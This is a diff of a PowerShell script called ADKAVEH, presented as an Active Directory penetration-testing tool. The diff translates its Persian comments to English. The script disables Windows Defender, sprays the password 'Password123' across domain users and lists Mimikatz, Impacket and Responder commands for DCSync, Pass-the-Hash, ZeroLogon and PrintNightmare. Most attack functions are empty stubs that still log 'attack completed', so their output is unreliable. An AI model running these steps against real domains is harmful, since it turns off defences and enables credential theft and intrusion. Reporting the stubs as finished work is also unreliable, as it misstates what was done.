@@ -1,5 +1,6 @@
-﻿# تنظیمات لاگگیری
+# Configuration for logging
 $logFile = "admaster.log"
+
 function Log-Activity {
     param (
         [string]$message
@@ -10,21 +11,20 @@ function Log-Activity {
     Write-Host "[LOG] $message" -ForegroundColor Yellow
 }
 
-# بنر
+# Display a banner
 function Show-Banner {
     Write-Host @"
-    _    ____    _  __    ___     _______ _   _ 
+    _    ____    _      ___     _______ _   _
    / \  |  _ \  | |/ /   / \ \   / / ____| | | |
   / _ \ | | | | | ' /   / _ \ \ / /|  _| | |_| |
  / ___ \| |_| | | . \  / ___ \ V / | |___|  _  |
 /_/   \_\____/  |_|\_\/_/   \_\_/  |_____|_| |_|
-                                                
-                                                        "
+                                                 "
 @ -ForegroundColor Green
-    Write-Host "ADKAVEH - ابزار مدیریت و تست نفوذ Active Directory" -ForegroundColor Blue
+    Write-Host "ADKAVEH - Active Directory Management and Penetration Testing Tool" -ForegroundColor Blue
 }
 
-# غیرفعال کردن موقت Windows Defender
+# Temporarily disable Windows Defender
 function Disable-WindowsDefender {
     Log-Activity "Disabling Windows Defender temporarily..."
     try {
@@ -35,7 +35,7 @@ function Disable-WindowsDefender {
     }
 }
 
-# جمع‌آوری اطلاعات Kerberoasting
+# Collect Kerberoasting information
 function Invoke-KerberoastingScan {
     param (
         [string]$domainName,
@@ -44,20 +44,20 @@ function Invoke-KerberoastingScan {
     )
     Log-Activity "Starting Kerberoasting scan..."
     try {
-        # استفاده از Impacket برای Kerberoasting
-        # این بخش نیاز به نصب و تنظیم Impacket دارد
-        # مثال: GetUserSPNs.py -request -dc-ip $domainName $domainName/$username:$password
+        # Use Impacket for Kerberoasting
+        # This section requires Impacket to be installed and configured
+        # Example: GetUserSPNs.py -request -dc-ip $domainName $domainName/$username:$password
         Log-Activity "Kerberoasting scan completed."
     } catch {
         Log-Activity "Kerberoasting scan failed: $_"
     }
 }
 
-# بررسی ACL (سوء استفاده از دسترسی‌ها)
+# Check ACL (Access Control List) for abuses
 function Invoke-ACLAbuseScan {
     Log-Activity "Starting ACL Abuse scan..."
     try {
-        # استفاده از PowerView-like functionality
+        # Use PowerView-like functionality
         Get-DomainObjectAcl -Identity 'Domain Admins' | Where-Object { $_.ActiveDirectoryRights -match 'WriteProperty' }
     } catch {
         Log-Activity "ACL Abuse scan failed: $_"
@@ -68,9 +68,9 @@ function Invoke-ACLAbuseScan {
 function Invoke-PasswordSprayingAttack {
     Log-Activity "Starting Password Spraying attack..."
     try {
-        # لیست کاربران
+        # List of users
         $users = net user /domain | Select-String -Pattern "User name"
-        # رمز عبور تستی
+        # Test password
         $testPassword = "Password123"
         foreach ($user in $users) {
             Log-Activity "Trying password for user: $user"
@@ -81,11 +81,11 @@ function Invoke-PasswordSprayingAttack {
     }
 }
 
-# شناسایی Golden Ticket
+# Detect Golden Ticket
 function Invoke-GoldenTicketDetection {
     Log-Activity "Starting Golden Ticket detection..."
     try {
-        # بررسی رویدادهای امنیتی مرتبط با Kerberos
+        # Check security events related to Kerberos
         wevtutil qe Security /q:"*[System[(EventID=4769)]]" /f:text
     } catch {
         Log-Activity "Golden Ticket detection failed: $_"
@@ -96,9 +96,9 @@ function Invoke-GoldenTicketDetection {
 function Invoke-PassTheHashAttack {
     Log-Activity "Starting Pass-the-Hash attack..."
     try {
-        # استفاده از Mimikatz برای Pass-the-Hash
-        # این بخش نیاز به نصب و تنظیم Mimikatz دارد
-        # مثال: mimikatz # sekurlsa::pth /user:username /domain:domain /ntlm:hash
+        # Use Mimikatz for Pass-the-Hash
+        # This section requires Mimikatz to be installed and configured
+        # Example: mimikatz # sekurlsa::pth /user:username /domain:domain /ntlm:hash
         Log-Activity "Pass-the-Hash attack completed."
     } catch {
         Log-Activity "Pass-the-Hash attack failed: $_"
@@ -109,22 +109,23 @@ function Invoke-PassTheHashAttack {
 function Invoke-PassTheTicketAttack {
     Log-Activity "Starting Pass-the-Ticket attack..."
     try {
-        # استفاده از Mimikatz برای Pass-the-Ticket
-        # این بخش نیاز به نصب و تنظیم Mimikatz دارد
-        # مثال: mimikatz # kerberos::ptt ticket.kirbi
+        # Use Mimikatz for Pass-the-Ticket
+        # This section requires Mimikatz to be installed and configured
+        # Example: mimikatz # kerberos::ptt ticket.kirbi
         Log-Activity "Pass-the-Ticket attack completed."
     } catch {
         Log-Activity "Pass-the-Ticket attack failed: $_"
     }
 }
 
+
 # BloodHound Data Collection
 function Invoke-BloodHoundDataCollection {
     Log-Activity "Starting BloodHound data collection..."
     try {
-        # استفاده از BloodHound برای جمع‌آوری داده‌ها
-        # این بخش نیاز به نصب و تنظیم BloodHound دارد
-        # مثال: Invoke-BloodHound -CollectionMethod All -OutputDirectory .\BloodHound
+        # Use BloodHound for data collection
+        # This section requires BloodHound to be installed and configured
+        # Example: Invoke-BloodHound -CollectionMethod All -OutputDirectory .\BloodHound
         Log-Activity "BloodHound data collection completed."
     } catch {
         Log-Activity "BloodHound data collection failed: $_"
@@ -135,9 +136,9 @@ function Invoke-BloodHoundDataCollection {
 function Invoke-DCSyncAttack {
     Log-Activity "Starting DCSync attack..."
     try {
-        # استفاده از Mimikatz برای DCSync
-        # این بخش نیاز به نصب و تنظیم Mimikatz دارد
-        # مثال: mimikatz # lsadump::dcsync /domain:domain /all /csv
+        # Use Mimikatz for DCSync
+        # This section requires Mimikatz to be installed and configured
+        # Example: mimikatz # lsadump::dcsync /domain:domain /all /csv
         Log-Activity "DCSync attack completed."
     } catch {
         Log-Activity "DCSync attack failed: $_"
@@ -148,9 +149,9 @@ function Invoke-DCSyncAttack {
 function Invoke-SMBRelayAttack {
     Log-Activity "Starting SMB Relay attack..."
     try {
-        # استفاده از Responder برای SMB Relay
-        # این بخش نیاز به نصب و تنظیم Responder دارد
-        # مثال: responder -I <interface>
+        # Use Responder for SMB Relay
+        # This section requires Responder to be installed and configured
+        # Example: responder -I <interface>
         Log-Activity "SMB Relay attack completed."
     } catch {
         Log-Activity "SMB Relay attack failed: $_"
@@ -161,9 +162,9 @@ function Invoke-SMBRelayAttack {
 function Invoke-ZeroLogonAttack {
     Log-Activity "Starting ZeroLogon attack..."
     try {
-        # استفاده از CVE-2020-1472 exploit
-        # این بخش نیاز به نصب و تنظیم ابزارهای مخصوص دارد
-        # مثال: zerologon.py <target_ip>
+        # Use CVE-2020-1472 exploit
+        # This section requires specific tools to be installed and configured
+        # Example: zerologon.py <target_ip>
         Log-Activity "ZeroLogon attack completed."
     } catch {
         Log-Activity "ZeroLogon attack failed: $_"
@@ -174,9 +175,9 @@ function Invoke-ZeroLogonAttack {
 function Invoke-PrintNightmareAttack {
     Log-Activity "Starting PrintNightmare attack..."
     try {
-        # استفاده از CVE-2021-34527 exploit
-        # این بخش نیاز به نصب و تنظیم ابزارهای مخصوص دارد
-        # مثال: printnightmare.py <target_ip>
+        # Use CVE-2021-34527 exploit
+        # This section requires specific tools to be installed and configured
+        # Example: printnightmare.py <target_ip>
         Log-Activity "PrintNightmare attack completed."
     } catch {
         Log-Activity "PrintNightmare attack failed: $_"
@@ -187,28 +188,28 @@ function Invoke-PrintNightmareAttack {
 function Invoke-LDAPRelayAttack {
     Log-Activity "Starting LDAP Relay attack..."
     try {
-        # استفاده از Responder برای LDAP Relay
-        # این بخش نیاز به نصب و تنظیم Responder دارد
-        # مثال: responder -I <interface>
+        # Use Responder for LDAP Relay
+        # This section requires Responder to be installed and configured
+        # Example: responder -I <interface>
         Log-Activity "LDAP Relay attack completed."
     } catch {
         Log-Activity "LDAP Relay attack failed: $_"
     }
 }
 
-# اجرای اسکریپت
+# Main script execution
 Show-Banner
 
-# دریافت اطلاعات دامنه
+# Get domain information
 $domainName = Read-Host "Enter the domain name"
 $username = Read-Host "Enter the username"
 $password = Read-Host "Enter the password" -AsSecureString
 
 try {
-    # غیرفعال کردن موقت Windows Defender
+    # Temporarily disable Windows Defender
     Disable-WindowsDefender
 
-    # جمع‌آوری اطلاعات عمومی
+    # Gather generic AD info
     Log-Activity "Gathering generic AD info..."
     Write-Host "Domain Name: $env:USERDOMAIN"
     Write-Host "DNS Domain Name: $env:USERDNSDOMAIN"
@@ -216,7 +217,7 @@ try {
     Write-Host "DNS Host Name: $(hostname)"
     Write-Host "Computer Name: $(hostname)"
 
-    # اجرای اسکن‌های پیشرفته
+    # Run advanced scans
     Invoke-KerberoastingScan -domainName $domainName -username $username -password $password
     Invoke-ACLAbuseScan
     Invoke-PasswordSprayingAttack
@@ -234,12 +235,12 @@ try {
     Log-Activity "An error occurred: $_"
 }
 
-# بنر پایانی
+# Final banner
 Write-Host @"
-                                                                         _  _   _  __    ___     _______ _   _
- _| || |_| |/ /   / \ \   / / ____| | | |
+   _  _   _      ___     _______ _   _
+ _|  |_| |/ /   / \ \   / / ____| | | |
 |_  ..  _| ' /   / _ \ \ / /|  _| | |_| |
 |_      _| . \  / ___ \ V / | |___|  _  |
-  |_||_| |_|\_\/_/   \_\_/  |_____|_| |_|
+  |__| |_|\_\/_/   \_\_/  |_____|_| |_|
                                           "
 @ -ForegroundColor Green
